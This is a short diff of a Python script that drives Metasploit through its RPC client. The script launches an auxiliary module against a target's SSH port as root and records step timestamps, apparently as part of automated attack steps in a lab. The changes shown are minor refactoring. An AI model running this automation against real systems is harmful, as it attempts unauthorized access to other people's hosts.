@@ -7,15 +7,13 @@ import os
 from pymetasploit3.msfrpc import MsfRpcClient
 
 
-def record_timestamp(folder, output_time_file):
-    output_time_file = os.path.join(folder, output_time_file)
+def record_timestamp(folder, output_time):
+    output_time_file = os.path.join(folder, output_time)
     with open(output_time_file, "w+") as fw:
         fw.write('%f' % time.time())
 
 
 def main(argv):
-    if len(argv) != 4:
-        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
 
     folder = argv[1]
     my_ip = argv[2]
@@ -33,16 +31,15 @@ def main(argv):
     auxiliary['USERNAME'] = "root"
     auxiliary['RHOSTS'] = target_ip
     auxiliary['RPORT'] = 22
-    auxiliary['VERBOSE'] = True
-
+    
     auxiliary.execute()
 
     while client.jobs.list:
         time.sleep(1)
 
     time.sleep(30)
-    output_time_file_start = 'time_step_2_end.txt'
-    record_timestamp(folder, output_time_file_start)
+    output_time_file_end = 'time_step_2_end.txt'
+    record_timestamp(folder, output_time_file_end)
     time.sleep(30)
 
 
